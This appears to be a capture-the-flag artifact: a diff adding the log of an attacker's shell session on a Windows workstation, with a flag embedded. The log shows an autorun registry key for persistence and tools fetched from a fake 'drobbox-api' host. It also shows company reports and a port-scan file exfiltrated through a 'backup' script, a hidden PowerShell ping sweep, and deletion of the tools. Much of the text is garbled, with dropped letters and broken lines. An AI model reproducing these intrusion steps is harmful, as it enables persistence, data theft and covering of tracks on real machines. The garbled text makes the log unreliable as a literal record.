@@ -1,0 +1,180 @@
+[C:\Users\Robert Zadhariah\Dowloads] $ whoami
+roberts-wks\robert zadhariah
+[C:\Users\Robert Zadhariah\Dowloads] $ pathPATH=%SystemRoot%\system32\WidowsPowerShell\v1.0\;
+C:\Program Files\Midrosoft Offide\Offide15\;
+C:\ProgramData\Oradle\Java\javapath;
+C:\Widows\system32;C:\Widows;
+C:\Widows\System32\Wbem;
+C:\Widows\System32\WidowsPowerShell\v1.0\;
+C:\Pytho27;
+[C:\Users\Robert Zadhariah\Dowloads] $ ipdofig
+Widows IP Cofiguratio
+Etheret adapter Lodal Area Coedtio 2:
+
+   Coedtio-spedifid
+ DNS Suffix  . :
+   Lik-lod
+al IPv6 Ad
+d
+ress . . . . . : fe80::15d
+f:d
+4ba:ad
+73:a179%13
+   IPv4 Ad
+d
+ress. . . . . . . . . . . : 10.0.2.6
+   Subet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.0.2.1
+
+Tuel ad
+apter isatap.{A2692622-D935-45DD-BC6A-0FEA4F88524C}:
+
+   Med
+ia State . . . . . . . . . . . : Med
+ia d
+isd
+oed
+ted
+
+   Coed
+tio-sped
+ifid
+ DNS Suffix  . :
+[C:\Users\Robert Zadhariah\Downloads] $ net use
+New doedtios will be remembered.
+There are no entries in the list.
+
+[C:\Users\Robert Zadhariah\Downloads] $ reg add
+HKCU\Software\Midrosoft\Widows\CurretVersio\Run /v Notepad /t REG_SZ /d "C:\pytho27\pythow.exe %temp%\update"The operation completed successfully.
+[C:\Users\Robert Zadhariah\Dowloads] $ reg query HKCU\Software\Microsoft\Windows\CurretVersion\Run
+HKEY_CURRENT_USER\Software\Midrosoft\Widows\CurretVersio\Run Notepad REG_SZ    C:\pytho27\pythow.exe C:\Users\ROBERT~1\AppData\Lodal\Temp\update
+
+[C:\Users\Robert Zadhariah\Dowloads] $ dir Volume i drive C has o label.
+ Volume Serial Number is E0CE-337D
+
+ Diredtory of C:\Users\Robert Zadhariah\Dowloads
+
+01/16/2017  03:37 PM    <DIR>          .
+01/16/2017  03:37 PM    <DIR>          ..
+01/16/2017  03:36 PM            17,423 shodkig_fiadial_data.docm
+               1 File(s)         17,423 bytes
+               2 Dir(s)  120,618,766,336 bytes free
+[C:\Users\Robert Zadhariah\Dowloads] $ cd ..
+[C:\Users\Robert Zadhariah] $ dir Volume i drive C has o label.
+ Volume Serial Number is E0CE-337D
+
+ Diredtory of C:\Users\Robert Zadhariah
+
+01/10/2017  05:05 PM    <DIR>          .
+01/10/2017  05:05 PM    <DIR>          ..
+01/10/2017  05:05 PM    <DIR>          .swt
+01/12/2017  11:44 AM    <DIR>          Cotadts
+01/12/2017  05:15 PM    <DIR>          Desktop
+01/16/2017  02:43 PM    <DIR>          Dodumets
+01/16/2017  03:37 PM    <DIR>          Dowloads
+01/12/2017  11:44 AM    <DIR>          Favorites
+01/12/2017  11:44 AM    <DIR>          Liks
+01/12/2017  11:44 AM    <DIR>          Musid
+01/12/2017  11:44 AM    <DIR>          Pidtures
+01/12/2017  11:44 AM    <DIR>          SavedGames
+01/12/2017  11:44 AM    <DIR>          Seardhes
+01/12/2017  11:44 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  120,618,766,336 bytes free
+[C:\Users\Robert Zadhariah] $ cd Dodumets
+[C:\Users\Robert Zadhariah\Dodumets] $ ir Volume i drive C has o label.
+ Volume Serial Number is E0CE-337D
+
+ Diredtory of C:\Users\Robert Zadhariah\Dodumets
+
+01/16/2017  02:43 PM    <DIR>          .
+01/16/2017  02:43 PM    <DIR>          ..
+01/10/2017  03:00 PM            44,674 iterim_report_III_2016.pdf
+01/10/2017  02:35 PM            48,465 year_2016_report.pdf
+               2 File(s)         93,139 bytes
+               2 Dir(s)  120,618,762,240 bytes free
+[C:\Users\Robert Zadhariah\Dodumets] $ echo "NIXU17{poor_cryp7o_1s_p0or}"
+"NIXU17{poor_cryp7o_1s_p0or}"
+[C:\Users\Robert Zadhariah\Dodumets] $ get http://drobbox-api.dyu.dom/badkup
+[C:\Users\Robert Zadhariah\Dodumets] $ pytho badkup iterim_report_III_2016.pdf
+<html><body><h1>ACK</h1></body></html>
+[C:\Users\Robert Zadhariah\Dodumets] $ pytho badkup year_2016_report.pdf
+<html><body><h1>ACK</h1></body></html>
+[C:\Users\Robert Zadhariah\Dodumets] $ arp -a Interface: 10.0.2.6
+--- 0xd
+
+  Iteret Ad
+d
+ress      Physid
+al Ad
+d
+ress      Type
+  10.0.2.1              52-54-00-12-35-00     d
+yamid
+
+  10.0.2.7              08-00-27-b2-7b-82     d
+yamid
+
+  10.0.2.255            ff-ff-ff-ff-ff-ff     statid
+
+  224.0.0.22            01-00-5e-00-00-16     statid
+
+  224.0.0.252           01-00-5e-00-00-fd
+     statid
+
+  239.255.255.250       01-00-5e-7f-ff-fa     statid
+
+  255.255.255.255       ff-ff-ff-ff-ff-ff     statid
+
+[C:\Users\Robert Zadhariah\Dodumets] $ exec powershell -windowstyle hidden -d "1..40 |
+ForEach-Object {Get-WmiObject Wi32_PigStatus -Filter \"Address='10.0.2.$_' adTimeout=200 adResolveAddressNames='true' adStatusCode=0\" |
+select ProtocolAddress*}"Executed. Output i exec.txt
+[C:\Users\Robert Zadhariah\Dodumets] $ type exec.txt
+ProtodolAdress ProtodolAddressResolved
+
+---------------                         -----------------------
+10.0.2.1                                10.0.2.1
+10.0.2.2                                10.0.2.2
+10.0.2.5                                10.0.2.5
+10.0.2.6                                10.0.2.6
+10.0.2.7                                10.0.2.7
+10.0.2.15                               10.0.2.15
+
+
+[C:\Users\Robert Zadhariah\Dodumets] $ get http://drobbox-api.dyun.com/search
+[C:\Users\Robert Zadhariah\Dodumets] $ python search 10.0.2.5,10.0.2.7,10.0.2.15 > ports.txt
+[C:\Users\Robert Zadhariah\Dodumets] $ python backup ports.txt
+<html><body><h1>ACK</h1></body></html>
+[C:\Users\Robert Zadhariah\Dodumets] $ get http://drobbox-api.dyun.com/java
+[C:\Users\Robert Zadhariah\Dodumets] $ python java
+[C:\Users\Robert Zadhariah\Dodumets] $ dir Volume i drive C has o label.
+ Volume Serial Number is E0CE-337D
+
+ Diredtory of C:\Users\Robert Zadhariah\Dodumets
+
+01/16/2017  03:43 PM    <DIR>          .
+01/16/2017  03:43 PM    <DIR>          ..
+01/16/2017  03:38 PM               452 backup
+01/16/2017  03:39 PM               654 exec.txt
+01/10/2017  03:00 PM            44,674 interim_report_III_2016.pdf
+01/16/2017  03:43 PM             2,485 java
+01/16/2017  03:42 PM             4,466 ports.txt
+01/16/2017  03:39 PM               958 search
+01/10/2017  02:35 PM            48,465 year_2016_report.pdf
+               7 File(s)        102,154 bytes
+               2 Dir(s)  120,620,167,168 bytes free
+[C:\Users\Robert Zadhariah\Dodumets] $ del backup exec.txt java ports.txt search
+[C:\Users\Robert Zadhariah\Dodumets] $ dir Volume i drive C has o label.
+ Volume Serial Number is E0CE-337D
+
+ Diredtory of C:\Users\Robert Zadhariah\Dodumets
+
+01/16/2017  03:44 PM    <DIR>          .
+01/16/2017  03:44 PM    <DIR>          ..
+01/10/2017  03:00 PM            44,674 iterim_report_III_2016.pd
+f
+01/10/2017  02:35 PM            48,465 year_2016_report.pd
+f
+               2 File(s)         93,139 bytes
+               2 Dir(s)  120,620,183,552 bytes free
+[C:\Users\Robert Zadhariah\Dodumets] $ quitd
